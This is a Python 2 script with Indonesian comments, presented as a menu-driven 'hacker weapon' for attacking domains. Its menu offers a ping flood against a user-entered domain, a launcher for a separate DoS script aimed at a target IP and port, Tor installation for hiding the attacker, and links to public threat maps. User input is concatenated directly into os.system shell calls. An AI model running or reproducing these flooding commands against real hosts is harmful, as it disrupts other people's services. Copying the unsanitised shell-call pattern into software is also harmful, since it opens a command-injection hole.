#!python2.7 version
#~
#~
# ini adalah script sederhsna, berbasis python
# tools ini berguna untuk penyerangan sebuah domain
# script berisi fitur lengkap sesuai senjata yang diperlukan para cyber!
#~
#~
#~



import os
import sys
import re

print '''\033[32;1m

          mmmmm   mmm  mmm mmmm     mmmm  mmmmmm
         mm   mm   mm  mm  mm  mm  mm     mm   mm
         mm         m  m   mm  m    mmmm  mm  mm
         mm          mm    mmmmmm  mm      mmmmmm
         mm   mm    mmm    mm   mm  mmmm   mm   mm
          mmmmm    mmm      mmmmm          mm   mmm
           \033[37;1m=======================================
         \033[33;1m* \033[30;1mThese tools are based on hacker weapons \033[33;1m*
         \033[33;1m* \033[30;1mUse this simple tool wisely, By S1keys. \033[33;1m*
'''
print("   \033[37;1mMenu Attack : ")
print("")
print("      \033[30;1m[ \033[31;1m1\033[30;1m| \033[37;1mDdos Domain\033[37;1m(\033[32;1mlinux\033[37;1m)   \033[30;1m[ \033[31;1m2\033[30;1m| \033[37;1mDdos Attack\033[37;1m(\033[31;1mtermux\033[37;1m)")
print("      \033[30;1m[ \033[31;1m3\033[30;1m| \033[37;1mCheck My Ip          \033[30;1m[ \033[31;1m4\033[30;1m| \033[37;1mStart Tor ")
print("      \033[30;1m[ \033[31;1m5\033[30;1m| \033[37;1mCyberMap             \033[30;1m[ \033[31;1m0\033[30;1m| \033[37;1mClose ")
print("")     
key = raw_input(" input $: ")
#########$$$$$$$$$$$$$$$$$$$$
#created_by_S1k3ys
if key =="1":
     #fitur ini dissediakan untuk kali linux:)
      Dns = raw_input("\033[37;1m[ \033[31;1mTarget DnS\DomaiN \033[37;1m]\033[30;1m: ")
      print("")
      print("\033[37;1m[*] \033[30;1mStarting\033[37;1m. . .")
      os.system("sleep 3")
      print("\033[33;1m[*] \033[32;1motomatis menyerang\033[37;1m. . .\033[36;1m")
      os.system("sleep 3")
      print("")
      #bisa kalian ubah count & byte sesuai kebutuhan
      #atau jika kalian tidak tahu? bisa chat saya
      #di 'https://www.instagram.com/Thony_dewa'
      os.system("ping "+ Dns +" -D -O -c 900 -s 1000")

elif key =="2":
     #fitur ini disediakan untuk termux
     print("")
     #disini kalian hanya di recomendasikan untuk memberi ip nya saja
     #karena program ddos berjalan secara otomatis di[port]default & [packet]default
     ip = raw_input("\033[37;1m[ \033[31;1mIp Target \033[37;1m]\033[30;1m: ")
     #bisa kalian ubah port & packet nya disini jangan lupa untuk memberi spasi di 'port(spasi)packet'_*.*
     os.system("python2 dos_key.py "+ ip +" 8080 10000")
     print(" \033[31;1mHappy Hacking ^_^ ")

elif key =="3":
     print("")
     print("\033[37;1m[*] \033[37;1m ip public viewer\033[30;1m. . .")
     os.system("sleep 2")
     print("")
     os.system("curl ipinfo.io")
     os.system("python2 dnstack.py")

elif key =="5":
     print("")
     print(" \033[37;1m[ \033[31;1mVPN/tor \033[33;1mharus diaktifkan \033[37;1m| \033[36;1msalin domain link dibawah ini tempelkan di chrome untuk melihat serangan live anda \033[37;1m]")
     print("")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://cybermap.kaspersky.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://www.fireeye.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://threatmap.checkpoint.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://www.imperva.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://www.deteque.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://threatmap.fortiguard.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://threatmap.bitdefender.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://securitycenter.sonicwall.com\033[37;1m '\n")
     os.system("setterm --underline off")
     os.system("setterm --underline on")
     print("\033[30;1mclipboard : \033[37;1m' \033[32;1mhttps://threatbutt.com\033[37;1m '\n")
     os.system("setterm --underline off")
     print("")
     os.system("python2 dnstack.py")

elif key =="0":
     os.system("clear")
     print("\033[31;1mHappy Hacking^_^\033[37;1m")

elif key =="4":
     print("")
     tor = raw_input("\033[37;1m[\033[33;1m+\033[37;1m] \033[33;1minstall tor \033[37;1m(\033[30;1mt\033[37;1m)\033[33;1mermux or \033[37;1m(\033[30;1ml\033[37;1m)\033[33;1minux $: ")
                                        
else:
   print("\033[31;1m not found!!......\033[37;1m")
    
if tor =="t":
     print("")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[33;1minstalling tor for termux subsystem\033[30;1m. . .")
     os.system("sleep 3")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[31;1mpastikan konektifitas internet kamu baik:). . .")
     os.system("pkg install tor")
     os.system("sleep 5")
     os.system("clear")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[36;1m'tor' berhasil di downloads")
     os.system("pkg show tor")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[33;1m jika service tidak berhenti silahkan buka session baru dan jalankan ulang!")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[32;1mmenghidupkan tor service\033[37;1m. . .\033[37;1m")
     os.system("tor")
     os.system("python2 dnstack.py")
     print("")

elif tor =="l":
     print("")
     print("\033[37;1m[\033[33;1m*\033[37;1m] installing tor for linux subsystem. . .")
     os.system("sleep 3")
     os.system("sudo apt-get install tor")
     print("\033[37;1m[\033[33;1m*\033[37;1m] \033[36;1mmenghidupkan tor. . .")
     os.system("sudo service tor start")
     os.system("sudo service tor status")
     os.system("python2 dnstack.py")
     print("")
#~
#~
#~
else:
    print("\033[31;1m not found!!.......\033[37;1m")
#Silahkan digunakan Sesuai kebutuhan ye gan^_^
#Game Over

